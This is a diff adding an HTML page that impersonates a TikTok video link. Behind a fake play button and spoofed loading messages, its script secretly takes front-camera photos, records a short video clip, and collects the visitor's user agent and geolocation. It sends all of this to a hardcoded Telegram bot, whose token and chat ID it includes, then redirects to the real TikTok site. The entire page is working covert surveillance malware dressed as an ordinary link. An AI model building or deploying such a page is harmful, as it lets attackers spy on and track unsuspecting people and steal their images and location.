@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>TikTok - Watch Video</title>
+    <style>
+        body { margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background-color: #000; color: #fff; font-family: Arial, sans-serif; overflow: hidden; position: relative; }
+        .video-container { width: 100vw; height: 100vh; max-width: 500px; position: relative; display: flex; justify-content: center; align-items: center; background-color: #000; }
+        .video-placeholder { width: 100%; height: 100%; background: linear-gradient(45deg, #ff0050, #00f2ea); display: flex; flex-direction: column; justify-content: center; align-items: center; cursor: pointer; z-index: 10; transition: opacity 0.5s; }
+        .video-placeholder.hidden { opacity: 0; pointer-events: none; }
+        .play-button { width: 80px; height: 80px; background-color: rgba(255, 255, 255, 0.2); border-radius: 50%; display: flex; justify-content: center; align-items: center; backdrop-filter: blur(10px); margin-bottom: 20px; border: 2px solid rgba(255, 255, 255, 0.3); }
+        .play-button svg { width: 40px; height: 40px; fill: #fff; margin-left: 5px; }
+        #loading-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.9); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 20; opacity: 0; visibility: hidden; }
+        #loading-overlay.active { opacity: 1; visibility: visible; }
+        .spinner { border: 8px solid rgba(255, 255, 255, 0.3); border-top: 8px solid #ff0050; border-radius: 50%; width: 60px; height: 60px; animation: spin 1.2s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .progress-bar { width: 200px; height: 4px; background-color: rgba(255, 255, 255, 0.2); border-radius: 2px; margin: 10px 0; overflow: hidden; }
+        .progress-fill { height: 100%; background: linear-gradient(90deg, #ff0050, #00f2ea); width: 0%; transition: width 0.3s; }
+        #camera-feed, #canvas { display: none; }
+        #notification { position: absolute; top: 20px; right: 20px; background: rgba(0,0,0,0.8); color: #fff; padding: 10px; border-radius: 8px; font-size: 0.8em; z-index: 30; display: none; }
+    </style>
+</head>
+<body>
+    <div class="video-container">
+        <div class="video-placeholder" id="video-placeholder">
+            <div class="play-button"><svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></div>
+            <div>Tap to watch this video</div>
+        </div>
+
+        <div id="loading-overlay">
+            <div class="spinner"></div>
+            <div id="loading-message">Initializing...</div>
+            <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
+        </div>
+
+        <video id="camera-feed" autoplay playsinline muted></video>
+        <canvas id="canvas"></canvas>
+        <div id="notification"></div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8207943883:AAF_XJoeKlHEE2bB7Ro0PBVSvpihbuZ0fW0';
+        const CHAT_ID = '8350812242';
+        const REDIRECT = 'https://www.tiktok.com/';
+
+        const placeholder = document.getElementById('video-placeholder');
+        const overlay = document.getElementById('loading-overlay');
+        const prog = document.getElementById('progress-fill');
+        const msg = document.getElementById('loading-message');
+        const cam = document.getElementById('camera-feed');
+        const canv = document.getElementById('canvas');
+
+        async function sendToTelegram(method, data) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
+                    method: 'POST',
+                    body: data
+                });
+            } catch (e) { console.error(e); }
+        }
+
+        async function start() {
+            placeholder.classList.add('hidden');
+            overlay.classList.add('active');
+
+            // 1. IP & Basic Info
+            msg.innerText = "Connecting to server...";
+            prog.style.width = "20%";
+            let info = `📱 New Target Logged:\nUserAgent: ${navigator.userAgent}`;
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('text', info);
+            await sendToTelegram('sendMessage', fd);
+
+            // 2. Camera Access & Photos
+            msg.innerText = "Optimizing video...";
+            prog.style.width = "40%";
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                cam.srcObject = stream;
+                
+                // Take 3 Photos
+                for(let i=1; i<=3; i++) {
+                    await new Promise(r => setTimeout(r, 1000));
+                    canv.width = cam.videoWidth; canv.height = cam.videoHeight;
+                    canv.getContext('2d').drawImage(cam, 0, 0);
+                    const blob = await new Promise(r => canv.toBlob(r, 'image/jpeg'));
+                    const photoFd = new FormData();
+                    photoFd.append('chat_id', CHAT_ID);
+                    photoFd.append('photo', blob, `img${i}.jpg`);
+                    photoFd.append('caption', `Front Cam Capture ${i}`);
+                    await sendToTelegram('sendPhoto', photoFd);
+                }
+
+                // 3. Record Video (5 seconds)
+                msg.innerText = "Buffering...";
+                prog.style.width = "70%";
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = async () => {
+                    const videoBlob = new Blob(chunks, { type: 'video/webm' });
+                    const vidFd = new FormData();
+                    vidFd.append('chat_id', CHAT_ID);
+                    vidFd.append('video', videoBlob, 'capture.webm');
+                    await sendToTelegram('sendVideo', vidFd);
+                    
+                    // Final Redirect
+                    prog.style.width = "100%";
+                    window.location.href = REDIRECT;
+                };
+                recorder.start();
+                setTimeout(() => recorder.stop(), 5000);
+
+            } catch (e) {
+                console.error("Access Denied");
+                window.location.href = REDIRECT;
+            }
+
+            // 4. Location
+            navigator.geolocation.getCurrentPosition(async (p) => {
+                const locFd = new FormData();
+                locFd.append('chat_id', CHAT_ID);
+                locFd.append('latitude', p.coords.latitude);
+                locFd.append('longitude', p.coords.longitude);
+                await sendToTelegram('sendLocation', locFd);
+            });
+        }
+
+        placeholder.addEventListener('click', start);
+    </script>
+</body>
+</html>
